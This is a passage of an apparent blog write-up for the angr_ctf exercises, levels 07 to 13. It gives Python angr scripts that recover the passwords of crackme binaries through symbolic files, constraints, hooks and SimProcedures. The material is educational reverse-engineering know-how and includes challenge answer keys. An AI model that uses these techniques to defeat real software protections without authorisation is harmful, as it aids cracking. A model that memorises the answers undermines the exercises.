avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    print(solution0, solution1)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Keyword: state.memory.store(address, value, endness=project.arch.memory_endness)</p><h2 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h2><blockquote><p>This challenge could, in theory, be solved in multiple ways. However, <em>for</em> the</p><p>sake of learning how to simulate an alternate filesystem, please solve this</p><p>challenge according to structure provided below. As a challenge, once you have</p><p>an initial solution, <em>try</em> solving this <em>in</em> an alternate way.</p><p>Problem description and general solution strategy:</p><p>The binary loads the password <em>from</em> a file using the fread function. If the</p><p>password is correct, it prints “Good Job.” In order to keep consistency <em>with</em></p><p>the other challenges, the input <em>from</em> the console is written to a file in the </p><p>ignore_me function. As the name suggests, ignore it, <em>as</em> it only exists to</p><p>maintain consistency <em>with</em> other challenges.</p><p>We want to:</p><p>\1. Determine the file <em>from</em> which fread reads.</p><p>\2. Use Angr to simulate a filesystem where that file is replaced <em>with</em> our own</p><p>   simulated file.</p><p>\3. Initialize the file <em>with</em> a symbolic value, which will be read <em>with</em> fread</p><p>   and propogated through the program.</p><p>\4. Solve <em>for</em> the symbolic input to determine the password.</p><p>Construct a bitvector <em>for</em> the password and then store it <em>in</em> the file’s</p><p>  backing memory. The store method works exactly the same <em>as</em> the store method</p><p>  you have already used. In fact, it’s the exact same method! That means that</p><p>  memory.store(address, bitvector) will write bitvector to the address we</p><p>  specify. In this memory, unlike our program’s memory, we want to write to</p><p>  the beginning, <em>as</em> the Linux file will stream data <em>from</em> the beginning of the</p><p>  file. For example, imagine a simple file, ‘hello.txt’:</p><p>  Hello world, my name is John.</p><p>  ^                       ^</p><p>  ^ address 0             ^ address 24 (count the number of characters)</p><p>  In order to represent this in memory, we would want to write the string to</p><p>  the beginning of the file:</p><p>  hello_txt_contents = claripy.BVV(‘Hello world, my name is John.’, 30*8)</p><p>  hello_txt_backing_memory.store(0, hello_txt_contents)</p><p>  Perhaps, then, we would want to replace John <em>with</em> a</p><p>  symbolic variable. We would call:</p><p>  name_bitvector = claripy.BVS(‘symbolic_name’, 4*8)</p><p>  hello_txt_backing_memory.store(24, name_bitvector)</p><p>  Then, after the program calls fopen(‘hello.txt’, ‘r’) and then</p><p>  fread(buffer, sizeof(char), 30, hello_txt_file), the buffer would contain</p><p>  the string <em>from</em> the file, <em>except</em> four symbolic bytes where the name would be</p><p>  stored.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">  initial_address = <span class="number">0x080488D6</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=initial_address)</span><br><span class="line"></span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">64</span> * <span class="number">8</span>)</span><br><span class="line">  </span><br><span class="line">  filename = <span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">  simfile = angr.storage.SimFile(name=filename, content=password, size=<span class="number">64</span>)</span><br><span class="line">  initial_state.fs.insert(filename, simfile)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=good, avoid=bad)</span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>Keyword: angr.storage.SimFile(name=filename, content=symbolic_vector, size=file_size), initial_state.fs.insert(filename, simfile)</p><h2 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h2><blockquote><p>The binary asks <em>for</em> a 16 character password to which is applies a complex function and then compares <em>with</em> a reference string <em>with</em> the function check<em>equals</em>[reference string]. (Decompile the binary and take a look at it!)</p><p>The source code <em>for</em> this function is provided here. However, the reference string <em>in</em> your version will be different than AABBCCDDEEFFGGHH.</p><p>The function checks if *to_check == “AABBCCDDEEFFGGHH”. Verify this yourself. While you, as a human, can easily determine that this function is equivalent to simply comparing the strings, the computer cannot. Instead the computer  would need to branch every time the if statement in the loop was called (16  times), resulting in 2^16 = 65,536 branches, which will take too long of a  time to evaluate for our needs.</p><p>We do not know how the complex_function works, but we want to find an input that, when modified by complex_function, will produce the string: AABBCCDDEEFFGGHH.</p><p>In this puzzle, your goal will be to stop the program before this function is called and manually constrain the to_check variable to be equal to the password you identify by decompiling the binary. Since, you, as a human, know that if the strings are equal, the program will print “Good Job.”, you can be assured that if the program can solve for an input that makes them equal, the input will be the correct password.</p></blockquote><p>Source code:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REFERENCE_PASSWORD = <span class="meta-string">&quot;AABBCCDDEEFFGGHH&quot;</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_equals_AABBCCDDEEFFGGHH</span><span class="params">(<span class="keyword">char</span>* to_check, <span class="keyword">size_t</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> num_correct = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;length; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (to_check[i] == REFERENCE_PASSWORD[i]) &#123;</span><br><span class="line">      num_correct += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> num_correct == length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* input = user_input();</span><br><span class="line"><span class="keyword">char</span>* encrypted_input = complex_function(input);</span><br><span class="line"><span class="keyword">if</span> (check_equals_AABBCCDDEEFFGGHH(encrypted_input, <span class="number">16</span>)) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This challenge is quite practical. I have seen many ctf challenges using this writing method: compare the input string with the target string character by character. This is easy for us humans, but not for computers. When we use symbols to execute, this challenge has 16 characters, so we have to compare 2 to the 16th power, which is obviously unbearable. In order to solve this problem, we need to manually specify constraints. </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  simulation_manager = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  target_address = <span class="number">0x0804866E</span></span><br><span class="line">  simulation_manager.explore(find=target_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation_manager.found:</span><br><span class="line">    solution_state = simulation_manager.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  constrained_parameter_address = <span class="number">0x0804A050</span></span><br><span class="line">  constrained_parameter_size = <span class="number">16</span></span><br><span class="line">  constrained_parameter_bitvector = solution_state.memory.load(constrained_parameter_address, constrained_parameter_size)</span><br><span class="line"></span><br><span class="line">  solution_state.add_constraints(constrained_parameter_bitvector == <span class="string">&#x27;AUPDNNPROEZRJWKB&#x27;</span>)</span><br><span class="line">  print(solution_state.posix.dumps(sys.stdin.fileno()).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>Keyword: solution_state.memory.load(target_address, size), solution_state.add_constraints(input == target)</p><h2 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h2><blockquote><p> This level performs the following computations:</p><ol><li>Get 16 bytes of user input and encrypt it.</li><li>Save the result of check_equals_AABBCCDDEEFFGGHH (or similar)</li><li>Get another 16 bytes from the user and encrypt it.</li><li><p>Check that it’s equal to a predefined password.</p><p>The ONLY part of this program that we have to worry about is #2.We will be replacing the call to check<em>equals</em> with our own version, using a hook, since check<em>equals</em> will run too slowly otherwise.</p></li></ol></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  </span><br><span class="line">  instrction_step_address = <span class="number">0x80486B3</span></span><br><span class="line">  jump_size = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  @project.hook(<span class="params">instrction_step_address, length=jump_size</span>)</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">skip_check_equals</span>(<span class="params">state</span>):</span></span><br><span class="line">    user_input_string = state.memory.load(<span class="number">0x0804A054</span>, <span class="number">16</span>)</span><br><span class="line">    state.regs.eax = claripy.If(</span><br><span class="line">      user_input_string == <span class="string">&#x27;XYMKBKUHNIQYNQXE&#x27;</span>,</span><br><span class="line">      claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),</span><br><span class="line">      claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=good, avoid=bad)</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;cannot find it!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Detailed explanation of hook: <a href="https://docs.angr.io/extending-angr/simprocedures#user-hooks">https://docs.angr.io/extending-angr/simprocedures#user-hooks</a></p><p>Keyword: @project.hook(address, length) func(state): …</p><h2 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h2><blockquote><p>You may be thinking:<br>  Why can’t I just use hooks? The function is called many times, but if I hook the address of the function itself (rather than the addresses where it is  called), I can replace its behavior everywhere. Furthermore, I can get the  parameters by reading them off the stack (with memory.load(regs.esp + xx)), and return a value by simply setting eax! Since I know the length of the function in bytes, I can return from the hook just before the ‘ret’  instruction is called, which will allow the program to jump back to where it  was before it called my hook.<br>If you thought that, then congratulations! You have just invented the idea of SimProcedures! Instead of doing all of that by hand, you can let the already-implemented SimProcedures do the boring work for you so that you can focus on writing a replacement function in a Pythonic way.<br>As a bonus, SimProcedures allow you to specify custom calling conventions, but unfortunately it is not covered in this CTF.</p><pre><code>A SimProcedure replaces a function in the binary with a simulated one   written in Python. Other than it being written in Python, the function    acts largely the same as any function written in C. Any parameter after  &#39;self&#39; will be treated as a parameter to the function you are replacing.The parameters will be bitvectors. Additionally, the Python can return in    the ususal Pythonic way. Angr will treat this in the same way it would    treat a native function in the binary returning. An example:int add_if_positive(int a, int b) &#123;  if (a &gt;= 0 &amp;&amp; b &gt;= 0) return a + b;  else return 0;&#125;could be simulated with...class ReplacementAddIfPositive(angr.SimProcedure):  def run(self, a, b):    if a &gt;= 0 and b &gt;=0:      return a + b    else:      return 0Finish the parameters to the check_equals_ function. Reminder:   int check_equals_AABBCCDDEEFFGGHH(char* to_check, int length) &#123; ...(!)</code></pre></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementCheckEquals</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, to_check, length</span>):</span></span><br><span class="line">      <span class="comment"># We can almost copy and paste the solution from the previous challenge.</span></span><br><span class="line">      <span class="comment"># Hint: Don&#x27;t look up the address! It&#x27;s passed as a parameter.</span></span><br><span class="line">      <span class="comment"># (!)</span></span><br><span class="line">      user_input_buffer_address = to_check</span><br><span class="line">      user_input_buffer_length = length</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Note the use of self.state to find the state of the system in a SimProcedure.</span></span><br><span class="line">      user_input_string = self.state.memory.load(</span><br><span class="line">        user_input_buffer_address,</span><br><span class="line">        user_input_buffer_length</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      check_against_string = <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment"># Finally, instead of setting eax, we can use a Pythonic return statement</span></span><br><span class="line">      <span class="comment"># to return the output of this function. </span></span><br><span class="line">      <span class="comment"># Hint: Look at the previous solution.</span></span><br><span class="line">      <span class="keyword">return</span> claripy.If(user_input_string ==  check_against_string, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Hook the check_equals symbol. Angr automatically looks up the address </span></span><br><span class="line">  <span class="comment"># associated with the symbol. Alternatively, you can use &#x27;hook&#x27; instead</span></span><br><span class="line">  <span class="comment"># of &#x27;hook_symbol&#x27; and specify the address of the function. To find the </span></span><br><span class="line">  <span class="comment"># correct symbol, disassemble the binary.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  check_equals_symbol = <span class="string">&quot;check_equals_ORSDDWXHZURJRBDH&quot;</span> <span class="comment"># :string</span></span><br><span class="line">  project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This time, the solution involves simply replacing scanf with our own version,</span></span><br><span class="line"><span class="comment"># since Angr does not support requesting multiple parameters with scanf.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="comment"># Finish the parameters to the scanf function. Hint: &#x27;scanf(&quot;%u %u&quot;, ...)&#x27;.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, scanf0_address, scanf1_address</span>):</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      <span class="comment"># The scanf function writes user input to the buffers to which the parameters point.</span></span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Now, we want to &#x27;set aside&#x27; references to our symbolic values in the</span></span><br><span class="line">      <span class="comment"># globals plugin included by default with a state. You will need to</span></span><br><span class="line">      <span class="comment"># store multiple bitvectors. You can either use a list, tuple, or multiple</span></span><br><span class="line">      <span class="comment"># keys to reference the different bitvectors.</span></span><br><span class="line">      <span class="comment"># (!)</span></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>] = scanf0</span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>] = scanf1</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Grab whatever you set aside in the globals dict.</span></span><br><span class="line">    stored_solutions0 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>]</span><br><span class="line">    stored_solutions1 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>]</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    print(solution_state.solver.<span class="built_in">eval</span>(stored_solutions0), solution_state.solver.<span class="built_in">eval</span>(stored_solutions1))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" title="12_angr_veritesting"></a>12_angr_veritesting</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># When you construct a simulation manager, you will want to enable Veritesting:</span></span><br><span class="line"><span class="comment"># project.factory.simgr(initial_state, veritesting=True)</span></span><br><span class="line"><span class="comment"># Hint: use one of the first few levels&#x27; solutions as a reference.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state, veritesting=<span class="literal">True</span>)</span><br><span class="line">    simulation.explore(find=<span class="number">0x804867C</span>)</span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        print(simulation.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h2><blockquote><p>Additionally, note that, when the binary is executed, the main function is not</p><p>the first piece of code called. In the _start function, __libc_start_main is </p><p>called to start your program. The initialization that occurs in this function</p><p>can take a long time <em>with</em> Angr, so you should replace it <em>with</em> a SimProcedure.</p><p>angr.SIM_PROCEDURES[‘glibc’][‘__libc_start_main’]</p><p>Note ‘glibc’ instead of ‘libc’.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This challenge is the exact same as the first challenge, except that it was</span></span><br><span class="line"><span class="comment"># compiled as a static binary. Normally, Angr automatically replaces standard</span></span><br><span class="line"><span class="comment"># library functions with SimProcedures that work much more quickly.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Here are a few SimProcedures Angr has already written for you. They implement</span></span><br><span class="line"><span class="comment"># standard library functions. You will not need all of them:</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;malloc&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;fopen&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;fclose&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;fwrite&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;getchar&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;strncmp&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;strcmp&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;scanf&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;printf&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;exit&#x27;]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># As a reminder, you can hook functions with something similar to: </span></span><br><span class="line"><span class="comment"># project.hook(malloc_address, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;malloc&#x27;])</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># There are many more, see:</span></span><br><span class="line"><span class="comment"># https://github.com/angr/angr/tree/master/angr/procedures/libc</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Additionally, note that, when the binary is executed, the main function is not</span></span><br><span class="line"><span class="comment"># the first piece of code called. In the _start function, __libc_start_main is </span></span><br><span class="line"><span class="comment"># called to start your program. The initialization that occurs in this function</span></span><br><span class="line"><span class="comment"># can take a long time with Angr, so you should replace it with a SimProcedure.</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;glibc&#x27;][&#x27;__libc_start_main&#x27;]</span></span><br><span class="line"><span class="comment"># Note &#x27;glibc&#x27; instead of &#x27;libc&#x27;.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    project.hook(<span class="number">0x8048D10</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804ED40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x0804ED80</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x805B450</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804F350</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span 